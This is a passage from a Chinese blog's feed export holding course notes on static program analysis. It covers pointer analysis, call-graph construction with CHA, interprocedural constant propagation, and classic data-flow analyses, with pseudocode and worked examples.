class="title">ProcessCall</span><span class="params">(x, 𝑜𝑖)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> l: r = x.k(a1,…,an) ∈ S:</span><br><span class="line">        <span class="comment"># 获取方法m</span></span><br><span class="line">        𝑚 = Dispatch(𝑜𝑖, k)</span><br><span class="line">        <span class="comment"># pass receiver object to "this"</span></span><br><span class="line">        add &lt;m_this,&#123;𝑜𝑖&#125;&gt; to WL</span><br><span class="line">        <span class="keyword">if</span> l → m ∉ CG:</span><br><span class="line">            <span class="comment"># 构建call graph</span></span><br><span class="line">            add l → m to CG</span><br><span class="line">            <span class="comment"># 标记新方法为已知方法</span></span><br><span class="line">            AddReachable(m)</span><br><span class="line">            <span class="comment"># 传递每个参数，建边</span></span><br><span class="line">            <span class="keyword">for</span> parameter 𝑝𝑖 of m:</span><br><span class="line">                AddEdge(𝑎𝑖, 𝑝𝑖)</span><br><span class="line">            <span class="comment"># 传递返回值</span></span><br><span class="line">            AddEdge(𝑚_𝑟𝑒𝑡, r)</span><br></pre></td></tr></table></figure><h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>设有如下待分析代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A a = <span class="keyword">new</span> A();</span><br><span class="line">        A b = <span class="keyword">new</span> B();</span><br><span class="line">        A c = b.foo(a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A x)</span> </span>&#123; … &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function">A <span class="title">foo</span><span class="params">(A y)</span> </span>&#123;</span><br><span class="line">        A r = <span class="keyword">new</span> A();</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先程序初始化，有如下结果：</p><ul><li><p>worklist，由3、4行的new stmt：</p><p>WL=[&lt;a,{o3}&gt;,&lt;b,{o4}&gt;]</p></li><li><p>RM，<code>A.main()</code>成为已知函数：</p><p>RM={A.main()}</p></li><li><p>CG={}</p></li><li><p>PFG为空，因为没有assign</p></li></ul><p><strong>进入循环，处理 &lt;a,{o3}&gt;：</strong></p><p><code>a</code>没有store、load和call，因此只做<code>propagate(a,{o3})</code></p><ul><li><p>WL=[&lt;b,{o4}&gt;]</p></li><li><p>RM={A.main()}</p></li><li><p>CG={}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")</pre></li></ul><p><strong>处理 &lt;b,{o4}&gt;：</strong></p><ol><li><p>先做<code>propagate(b,{o4})</code>;</p></li><li><p>由于第5行存在调用，执行<code>ProcessCall(b, o4)</code>，在函数中，首先解析到调用函数为<code>m=B.foo(A)</code>，将 &lt;B.foo/this. {o4}&gt; 加入 worklist;</p></li><li><p>接着由于之前没有分析过该函数调用:</p><ol><li>将 <code>5→B.foo(A)</code> 加入CG</li></ol></li><li><p>调用 <code>AddReachable()</code></p><ol><li><p>将<code>B.foo(A)</code>加入到已知函数</p></li><li><p>注意到11行存在new操作，将{&lt;r, o11&gt;}加入worklist</p></li><li>调用 <code>AddEdge(ai, pi)</code>，更新PFG</li><li>调用<code>AddEdge(r, c)</code>，更新PFG</li></ol></li></ol><p>处理结果为：</p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5→B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")</pre></li></ul><p><strong>处理<code>&lt;B.foo/this, {o4}&gt;</code>：</strong></p><p>只需要做<code>Propagate(B.foo/this, {o4})</code></p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5→B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{}")      b("b{}")      r("r{}")-->c("c{}")      Bfoo("B.foo/this{o4}")</pre></li></ul><p>后续步骤类似，最后结果为：</p><ul><li><p>WL=[&lt;B.foo/this, {o4}&gt;, &lt;r, {o11}&gt;, &lt;y, {o3}&gt;]</p></li><li><p>RM={A.main(), B.foo(A)}</p></li><li><p>CG={5→B.foo(A)}</p></li><li><p>PFG:</p>  <pre class="mermaid">    graph RL      a("a{o3}")-->y("y{o3}")      b("b{o4}")      r("r{o11}")-->c("c{o11}")      Bfoo("B.foo/this{o4}")</pre></li></ul><h1 id="相关文献"><a href="#相关文献" class="headerlink" title="相关文献"></a>相关文献</h1><ol><li>William E. Weihl, “Interprocedural Data Flow Analysis in the Presence of Pointers, Procedure Variables, and Label Variables”. POPL 1980.</li><li>Vini Kanvar, Uday P. Khedker, “Heap Abstractions for Static Analysis”. ACM CSUR 2016.</li><li>Lars Ole Andersen, 1994. “Program Analysis and Specialization for the C Programming Language”. Ph.D. Thesis. University of Copenhagen.</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;CHA 只看定义类型，会得到很多实际不被调用的子类方法，如下图所示，CHA的常量分析时只能得到NAC&lt;/p&gt;&lt;p&gt;而指针分析会得到更精确的对象类型：&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/pl-静态程序分析课程笔记（指针分析）/image-20200818213708639.png&quot; alt=&quot;image-20200818213708639&quot;&gt;&lt;/p&gt;&lt;h1 id=&quot;Introduction-to-Pointer-Analysis&quot;&gt;&lt;a href=&quot;#Introduction-to-Pointer-Analysis&quot; class=&quot;headerlink&quot; title=&quot;Introduction to Pointer Analysis&quot;&gt;&lt;/a&gt;Introduction to Pointer Analysis&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;A fundamental static analysis, computes which memory locations a pointer can point to.&lt;/p&gt;
&lt;p&gt;For object-oriented programs, computes which objects a pointer (variable or field) can point to.&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="过程间分析" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（过程间分析）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（过程间分析）/</id>
    <published>2020-08-17T12:43:13.000Z</published>
    <updated>2020-08-23T12:32:22.053Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Motivation"><a href="#Motivation" class="headerlink" title="Motivation"></a>Motivation</h1><p>过程内分析遇到函数调用只能做保守假设，导致过多误报，而过程间分析可以跟进被调函数，因此更准确</p><h1 id="Call-Graph-Construction"><a href="#Call-Graph-Construction" class="headerlink" title="Call Graph Construction"></a>Call Graph Construction</h1><blockquote><p> A call graph is a set of call edges from  call-sites to their target methods (callees)</p></blockquote><a id="more"></a><p>Call Graph，程序中调用边的集合，调用边从调用点（call-site）出发到被调函数（callee），表示程序的调用关系</p><h2 id="调用图构建算法"><a href="#调用图构建算法" class="headerlink" title="调用图构建算法"></a>调用图构建算法</h2><p>调用图构建算法主要有以下四种：</p><ol><li>Class hierarchy analysis（CHA）</li><li>Rapid type analysis（RTA）</li><li>Variable type analysis（VTA）</li><li>Pointer analysis（k-CFA）</li></ol><p>由上至下分析越来越精确，但分析成本也越来越大</p><h2 id="Java调用指令"><a href="#Java调用指令" class="headerlink" title="Java调用指令"></a>Java调用指令</h2><div class="table-container"><table><thead><tr><th></th><th>静态调用</th><th>特殊调用</th><th>虚调用</th></tr></thead><tbody><tr><td>指令</td><td>invokestatic</td><td>invokespecial</td><td>invokeinterface, invokevirtual</td></tr><tr><td>是否接受对象实例</td><td>N</td><td>Y</td><td>Y</td></tr><tr><td>被调方法</td><td>静态方法</td><td>构造函数、私有实例函数、父类实例函数</td><td>其他实例方法</td></tr><tr><td>目标方法个数</td><td>1</td><td>1</td><td>≥1（多态）</td></tr><tr><td>绑定时间</td><td>编译时</td><td>编译时</td><td>运行时</td></tr></tbody></table></div><p>可以看到，处理虚调用是构造调用图的关键。</p><h2 id="Method-Dispatch"><a href="#Method-Dispatch" class="headerlink" title="Method Dispatch"></a>Method Dispatch</h2><p>在运行时，virtualcall调用（$o^1.foo(\dots)^2$）的函数主要基于两点：</p><ol><li>调用者实例对象类型($o^1$ 指针)，记为 $c$</li><li>调用点的函数签名，记为$m$</li></ol><p><strong>函数签名：</strong>包括类名、方法名、以及方法描述符（descriptor），下图为示例，函数签名表示为<code>C.foo(P, Q, R)</code><br><img src="/pl-静态程序分析课程笔记（过程间分析）/image-20200817210616520.png" alt="image-20200817210616520"></p><p>可以看到方法描述符包括了函数的返回值类型和参数类型。</p><p>定义函数 $\mathrm{Dispatch}(c,m)$，该函数模拟运行时究竟调用哪个函数</p><script type="math/tex; mode=display">Dispatch(c, m)=\left\{\begin{array}{ll}m' ,& \text{if } c \text{ contains non-abstract method }m' \\& \text{that has the same name and descriptor as }m\\  Dispatch(c', m), & \text{otherwise}\end{array}\right.\\\text{where }c'\text{ is superclass of }c</script><p>即当virtualinvoke时，如果当前类 $c$ 中存在一个非抽象函数 $m’$ ，该函数名称和摘要与$m$相同，那么调用该函数；</p><p>否则递归，对 $c$ 的<strong>父类</strong>调用 $Dispatch$，直到找到该方法。</p><h1 id="CHA（Class-Hierarchy-Analysis）"><a href="#CHA（Class-Hierarchy-Analysis）" class="headerlink" title="CHA（Class Hierarchy Analysis）"></a>CHA（Class Hierarchy Analysis）</h1><p>当调用发生时，解析调用类定义，根据定义类枚举其<strong>所有子类</strong>，所有子类符合要求的函数都是可能会被调用的函数。</p><p>通过检查A的所有子类，寻找被调用函数</p><p>具体算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Resolve</span><span class="params">(cs)</span>:</span> <span class="comment"># cs为call site</span></span><br><span class="line">T = &#123;&#125; <span class="comment"># 算法最终输出cs所有可能调用的函数集合</span></span><br><span class="line">    m = method signature at cs</span><br><span class="line">    <span class="comment"># 若 cs 是 staticcall，直接将该函数加入集合</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a static call:</span><br><span class="line">    T = &#123; m &#125; </span><br><span class="line">    <span class="comment"># 若 cs 是 specialcall，要处理三种方法，取方法m的类cm，并调用Dispatch()得到方法</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> special call:</span><br><span class="line">        cm = <span class="class"><span class="keyword">class</span> <span class="title">type</span> <span class="title">of</span> <span class="title">m</span></span></span><br><span class="line">        T = &#123; Dispatch(cm, m) &#125;</span><br><span class="line">    <span class="comment"># 若 cs 是virtualcall，首先获取包括cs自身类在内的所有子类，在将其dispatch()结果加入集合T中</span></span><br><span class="line">    <span class="keyword">if</span> cs <span class="keyword">is</span> a virtual call:</span><br><span class="line">        c = declared type of receiver variable at cs </span><br><span class="line">        <span class="keyword">for</span> each sub_c that <span class="keyword">is</span> a subclass of c <span class="keyword">or</span> C itself:</span><br><span class="line">            add Dispatch(sub_c, m) to T</span><br><span class="line">    <span class="keyword">return</span> T</span><br></pre></td></tr></table></figure><p>下图为实际示例，注意，CHA只考虑声明类型，不解析实例，因此在后面B即使实例化为new B()，但是解析仍然有3种，这也看出了CHA的缺陷。<br><img src="/pl-静态程序分析课程笔记（过程间分析）/image-20200817213356449.png" alt="image-20200817213356449"></p><h2 id="CHA特征"><a href="#CHA特征" class="headerlink" title="CHA特征"></a>CHA特征</h2><ul><li>快<ul><li>只考虑声明</li><li>忽略数据流和控制流</li></ul></li><li>不准<ul><li>导致假目标方法</li></ul></li><li>IDE常用的方法（比如说 IDEA）</li></ul><h2 id="用CHA构造整个程序CG"><a href="#用CHA构造整个程序CG" class="headerlink" title="用CHA构造整个程序CG"></a>用CHA构造整个程序CG</h2><ol><li><p>从一些入口函数开始（如<code>main()</code>）</p></li><li><p>对于每一个到达的方法 $m$，用CHA解析其中每个call sites，即（$Resolve(cs)$）</p></li><li><p>重复直到没有新的函数需要被发现</p></li></ol><p>可以用DFS或者BFS实现， 以下为BFS搜索算法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">BuildCallGraph(m_entry):</span><br><span class="line">WL = [m_entry] <span class="comment"># 工作队列</span></span><br><span class="line">CG = &#123;&#125; <span class="comment"># 存放callgraph，边的集合</span></span><br><span class="line">RM = &#123;&#125; <span class="comment"># 可达的方法（book）</span></span><br><span class="line"><span class="keyword">while</span> WL <span class="keyword">is</span> <span class="keyword">not</span> empty:</span><br><span class="line">remove m <span class="keyword">from</span> WL</span><br><span class="line">    <span class="keyword">if</span> m ∉ RM then add m to RM</span><br><span class="line">        <span class="comment"># 通过 CHA 解析m()中的所有调用 cs</span></span><br><span class="line">    <span class="keyword">for</span> cs <span class="keyword">in</span> m:</span><br><span class="line">     T = Resolve(cs)</span><br><span class="line"><span class="keyword">for</span> target_method <span class="keyword">in</span> T:</span><br><span class="line">add (cs → target_method) to CG <span class="comment"># 将调用加入到Callgraph中</span></span><br><span class="line">add target_method to WL</span><br><span class="line"><span class="keyword">return</span> CG</span><br></pre></td></tr></table></figure><h1 id="Interprocedural-Control-Flow-Graph"><a href="#Interprocedural-Control-Flow-Graph" class="headerlink" title="Interprocedural Control-Flow Graph"></a>Interprocedural Control-Flow Graph</h1><p>ICFG（Interprocedural Control-Flow Graph），在CFG基础上加上Call edges和Return edges</p><ul><li>Call edges：从调用点（call sites）出发至被调用函数（callees）</li><li>Return edges：从被调函数return语句出发至调用点的下一条语句（return sites）</li></ul><p>e.g.,<br><img src="/pl-静态程序分析课程笔记（过程间分析）/image-20200818202917677.png" alt="image-20200818202917677"></p><p>注意在添加两条边后，原先的边并不删去。</p><h1 id="Interprocedural-Data-Flow-Analysis"><a href="#Interprocedural-Data-Flow-Analysis" class="headerlink" title="Interprocedural Data-Flow Analysis"></a>Interprocedural Data-Flow Analysis</h1><p>过程间数据流分析即在 ICFG 上做分析</p><p>在 Transfer functions 中除了 CFG 中的 Node transfer 还加了 edge transfer：</p><ul><li>Call edge transfer：在 call node 至 callee 的第一个node 上传递数据流（传参数）</li><li>Return edge transfer：在 return node 至 return site 上传递控制流（传返回值）</li></ul><h2 id="Interprocedural-Constant-Propagation"><a href="#Interprocedural-Constant-Propagation" class="headerlink" title="Interprocedural Constant Propagation"></a>Interprocedural Constant Propagation</h2><p>过程间数据流分析并没有像过程内分析那样有规范的算法，这里以常量传播为例，解释过程间分析过程：</p><p><img src="/pl-静态程序分析课程笔记（过程间分析）/image-20200818204421280.png" alt="image-20200818204421280"></p><p>对于非函数调用语句，仍然用node transfer处理，遇到函数调用（call expression）时：</p><ol><li>kill掉左边的变量的值</li><li>由 <strong>Call edge transfer</strong> 将实参传递至callee enter 处，在callee上下文做过程间分析</li><li>分析至callee return时，由<strong>Return edge transfer</strong>将至传回caller上下文</li></ol><p><strong>关于是否保留call-to-return edge：</strong></p><p>保留call-to-return edge，可以保留caller上下文数据变量，若没有这条边则需要把当前函数上下文变量传进被调函数（如分析 <code>ten()</code> 时，需要传递<code>a, b, c</code>），这是低效的。</p><p><strong>注意</strong>在call expression时，先把left的值kill掉（如调用<code>ten()</code>是，先把b的值kill，否则会产生冲突）</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本节主要讲了过程间分析主要方法，即先生成Callgraph，再合成ICFG进行数据流分析，并且介绍了一个简单的生成CallGraph的方法——CHA，并且可以看到CHA有较大缺陷。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Motivation&quot;&gt;&lt;a href=&quot;#Motivation&quot; class=&quot;headerlink&quot; title=&quot;Motivation&quot;&gt;&lt;/a&gt;Motivation&lt;/h1&gt;&lt;p&gt;过程内分析遇到函数调用只能做保守假设，导致过多误报，而过程间分析可以跟进被调函数，因此更准确&lt;/p&gt;&lt;h1 id=&quot;Call-Graph-Construction&quot;&gt;&lt;a href=&quot;#Call-Graph-Construction&quot; class=&quot;headerlink&quot; title=&quot;Call Graph Construction&quot;&gt;&lt;/a&gt;Call Graph Construction&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt; A call graph is a set of call edges from  call-sites to their target methods (callees)&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="过程间分析" scheme="http://anemone.top/tags/%E8%BF%87%E7%A8%8B%E9%97%B4%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>静态程序分析课程笔记（数据流分析-应用）</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90-%E5%BA%94%E7%94%A8%EF%BC%89/"/>
    <id>http://anemone.top/pl-静态程序分析课程笔记（数据流分析-应用）/</id>
    <published>2020-08-02T09:34:13.000Z</published>
    <updated>2020-08-15T09:54:31.368Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-amp-Preliminaries"><a href="#Overview-amp-Preliminaries" class="headerlink" title="Overview &amp;  Preliminaries"></a>Overview &amp;  Preliminaries</h1><p>两类分析：</p><ul><li><p>may Analysis：over-approximation</p></li><li><p>must Analysis：under-approximation</p></li></ul><p>实际上都是为了safety of analysis。</p><h2 id="对数据流分析的几种解释"><a href="#对数据流分析的几种解释" class="headerlink" title="对数据流分析的几种解释"></a>对数据流分析的几种解释</h2><a id="more"></a><p>解释一：</p><blockquote><p>An analysis to figure out “how <strong>application-specific Data</strong> Flows through the <strong>Nodes(BBs/statements)</strong> and <strong>Edges(control flows) </strong>of CFG(a program)?”</p></blockquote><p>对于application-specific data，由对变量或表达式<strong>抽象（Abstraction）</strong>表示；对于Nodes，由<strong>Transfer function</strong>处理；对于Edges，有<strong>Control-flow handing</strong>处理。</p><p>Abstraction、Transfer function和Control-flow handing是设计一个数据流分析的三个关键要素。</p><p>解释二：</p><blockquote><p>In each data-flow analysis application, we associate with every program point a data-flow value that represents an abstraction of the set of all possible program states that can be observed for that point.</p></blockquote><p>控制流分析即给出每一个程序点一个控制流的值，该值是表示在该点能分析到的所有可能结果的抽象表示。</p><p>解释三：</p><blockquote><p>Data-flow analysis is to find a solution to a set of safe-approximation-directed constraints on the IN[s]’s and OUT[s]’s, for all statements $s$.</p></blockquote><p>控制流分析即在safe-approximation规则（may or mast）约束下，解出每一个statements的IN和OUT。</p><p>这里的IN和OUT指每一个语句的输入和输出。</p><p>这里的约束包含了语义（转换函数）和控制流信息（Control-flow Handing）。</p><h2 id="转换函数（transfer-function）"><a href="#转换函数（transfer-function）" class="headerlink" title="转换函数（transfer function）"></a>转换函数（transfer function）</h2><p>分析单个BB的函数，存在前向分析和后向分析：</p><ul><li><p>前向分析（Forward Analysis）<br>$Out[s]=f_s(IN[s])$</p></li><li><p>后向分析（Backward Analysis），将CFG反向等于Forward<br>$In[s]=f_s(OUT[s])$</p></li></ul><h2 id="控制流信息处理（Control-flow-Handling）"><a href="#控制流信息处理（Control-flow-Handling）" class="headerlink" title="控制流信息处理（Control-flow Handling）"></a>控制流信息处理（Control-flow Handling）</h2><p>定义数据流在BBs间的流动方式，控制流中的BBs存在三种情况：</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802175052488.png" alt="image-20200802175052488"></p><p>后两种情况存在meet操作（第二种后向分析存在）</p><p><img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802175345773.png" alt="image-20200802175345773"></p><p>对于第三种情况下的前向分析，B的IN是所有入向的代码块OUT的meet；对于第二种情况下的后向分析，B的OUT是所有出向代码块IN的meet。</p><h1 id="Reaching-Definitions-Analysis"><a href="#Reaching-Definitions-Analysis" class="headerlink" title="Reaching Definitions Analysis"></a>Reaching Definitions Analysis</h1><blockquote><p>A definition $d$ at program point $p$ reaches a point $q$ if there is a path from $p$ to $q$ such that $d$ is not “killed” along that path.</p></blockquote><p>对于在程序点 $p$ 处变量v的<strong>定义d</strong>，检测其在$ p\sim q$的路径上是否有新的定义（可以用于空指针问题）</p><h2 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h2><ol><li><p>Data Flow Values<br> 用bit vecotr表示集合，集合中元素表示每一到达该点的语句<br> e.g. D1, D2, … , Dn=01…0 (表示D2定义在当且位置有新定义)</p></li><li><p>定义Transfer Function和Control-flow Handing</p><p> <strong>Transfer Function：</strong></p><p> 对于一个定义语句<code>D: v = x op y</code>，kill（在集合）与v相关的其他语句，并在集合中加入D，即：</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><p> <strong>Control-flow Handing：</strong></p><p> 当多个代码块汇聚时，合并所有的定义（may）</p><script type="math/tex; mode=display">\mathrm{IN}[B]=\bigcup_{P \text { a predecessor of } B} OUT [P]</script></li><li><p>应用经典的数据流分析算法框架（Iterative algorithm）<br> <img src="/pl-静态程序分析课程笔记（数据流分析-应用）/8890_1.png" alt="Iterative algorithm"></p><h2 id="遍历结果"><a href="#遍历结果" class="headerlink" title="遍历结果"></a>遍历结果</h2><p><img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802193730918.png" alt="image-20200802193730918"></p></li></ol><h2 id="为什么能到不动点-fixed-point"><a href="#为什么能到不动点-fixed-point" class="headerlink" title="为什么能到不动点(fixed point)"></a>为什么能到不动点(fixed point)</h2><p>再次考虑Transfer Function：</p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-k i l l_{B}\right)</script><ul><li>因为 gen和kill是不变的</li><li>当新的变化进来时，经过kills，存在$survivor_s$加入OUT[S]</li><li>因此那些加入到OUT[S]的新变化，要么来自于gen，要么来自于$survivor_s$，而这些变化将永远保留（集合中永远存在这些位置）</li><li>因此OUT的变化是单调增的(只会0-&gt;1,1-&gt;1)</li></ul><p>总结下来，每个BB的Transfer Function是一个单调增函数，又因为值域是有上限的（最大不动点），因此算法最终会停止。</p><h1 id="Live-Variable-Analysis"><a href="#Live-Variable-Analysis" class="headerlink" title="Live Variable Analysis"></a>Live Variable Analysis</h1><blockquote><p>Live variables analysis tells whether the value of variable $v$ at program point $p$ could be used along some path in CFG starting at $p$. If so , $v$ is live at $p$; otherwise, $v$ is dead at $p$.</p></blockquote><p>对于在CFG程序点 $p$（注意 $p$ 是一个定点）上定义的<strong>变量 $v$ </strong>，在某条路径上可能被使用（$v$ 在使用前不被重新定义），那么称 $v$ 在 $p$ 上成活。<br>（使用场景：寄存器用完之后，检查哪个寄存器可以被清除——若寄存器中的变量dead）</p><h2 id="算法设计-1"><a href="#算法设计-1" class="headerlink" title="算法设计"></a>算法设计</h2><ol><li><p>Data Flow Values，依然用bit vector，<strong>注意这次记录变量</strong><br> 如：V1,V2,…,Vn=01…0 （V2在p上的定义被使用i.e.,不能清空V2寄存器）</p></li><li><p>定义Transfer Function和Control-flow Handing</p><p> 讨论forward还是backward，<strong>把变量当寄存器想</strong>，当决定一个寄存器是否可以清空的时候，需要往后看，后面的程序是否用到这个寄存器，因此用backward。</p><p> <strong>Transfer Function：</strong></p><script type="math/tex; mode=display">\mathrm{IN}[B]=use_{B} \cup\left(\mathrm{OUT}[B]-def_{B}\right)</script><p> 其中，$IN[B]$指v在B中重定义前被使用，$OUT[B]$指v在B代码块中没有重定义，$def_B$指v在B中被重定义。</p><p> <strong>Control-flow Handing：</strong></p><p> may analysis，依旧是∪：</p><script type="math/tex; mode=display">\mathrm{OUT}[\mathrm{B}]=\bigcup_{S \text{ a successor of B}}  {\mathrm{IN}[\mathrm{S}]}</script></li><li><p>不动点算法<br>  <img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802203143027.png" alt="image-20200802203143027"></p><h2 id="分析结果"><a href="#分析结果" class="headerlink" title="分析结果"></a>分析结果</h2><p><img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802202534370.png" alt="image-20200802202534370"></p></li></ol><h1 id="Avaliable-Expression-Analysis"><a href="#Avaliable-Expression-Analysis" class="headerlink" title="Avaliable Expression Analysis"></a>Avaliable Expression Analysis</h1><blockquote><p>An expression $x \text{ op } y$ is available at program point $p$ if (1) all paths from the entry to $p$ must passthrough the evaluation of , $x \text{ op } y$and (2) after the last evaluation of $x \text{ op } y$, there is no redefinition of $x \text{ op } y$.</p></blockquote><p>表达式 $x \text{ op } y$ 为availbable 当且仅当 （1）所有路径都经过 $x \text{ op } y$ （2）最后一个计算  $x \text{ op } y$ 后，不再有 $x$ 和$y$ 的重新赋值。</p><p>如果表达式available，则优化最后一次的计算，例如：<br><img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802204136008.png" alt="image-20200802204136008"></p><p>c可以被优化，例如，将a，b，c全转化为y，最后一步则不用计算（不论走什么分支，最后的t都不用计算）</p><h2 id="算法设计-2"><a href="#算法设计-2" class="headerlink" title="算法设计"></a>算法设计</h2><ol><li><p>Data Flow Values<br> available的表达式集合，可用bitVector表示，如：</p><p>E1,E2,…,En=01…0(E2为available)</p></li><li><p>定义Transfer Function和Control-flow Handing</p><p> <strong>Transfer Function：</strong></p><script type="math/tex; mode=display">\mathrm{OUT}[B]=gen_{B} \cup\left(\mathrm{IN}[B]-kill_{B}\right)</script><p> 这里的$kill_{B}$指删除表达式，这些表达式的变量在当前块B中被重新定义。</p><p> <strong>Control-flow Handing：</strong></p><script type="math/tex; mode=display">\mathrm{N}[B]=\bigcap_{P a \text { predecessor of } B} OUT [P]</script><p> must analysis，由“∪”变成了“∩”</p></li><li><p>算法，注意每个bb的初始化，变成了“All”，即初始状态所有表达式都是available的（反向思维，如果初始化为0，那么$\cap$后恒为0，计算无效）<br> <img src="/pl-静态程序分析课程笔记（数据流分析-应用）/image-20200802205253641.png" alt="image-20200802205253641"></p></li></ol><h1 id="综合比较"><a href="#综合比较" class="headerlink" title="综合比较"></a>综合比较</h1><div class="table-container"><table><thead><tr><th></th><th>Reaching Definitions</th><th>Live Variables</th><th>Available</th></tr></thead><tbody><tr><td>Domain(研究对象的集合)</td><td>定义集合</td><td>变量集合</td><td>表达式集合</td></tr><tr><td>Direction(数据状态的依赖关系)</td><td>Forwards</td><td>Backwards</td><td>Forwards</td></tr><tr><td>May/Must(应用场景)</td><td>May</td><td>May</td><td>Must</td></tr><tr><td>Boundary(Direction&amp;May/Must)</td><td>$\mathrm{OUT}[entry]=\emptyset$</td><td>$\mathrm{IN}[exit]=\emptyset$</td><td>$\mathrm{OUT}[entry]=\emptyset$</td></tr><tr><td>Initialization(Direction&amp;May/Must)</td><td>$\mathrm{B}[entry]=\emptyset$</td><td>$\mathrm{In}[B]=\emptyset$</td><td>$\mathrm{OUT}[B]=\emptyset$</td></tr><tr><td>Transfer function</td><td>$\mathrm{OUT}=gen \cup 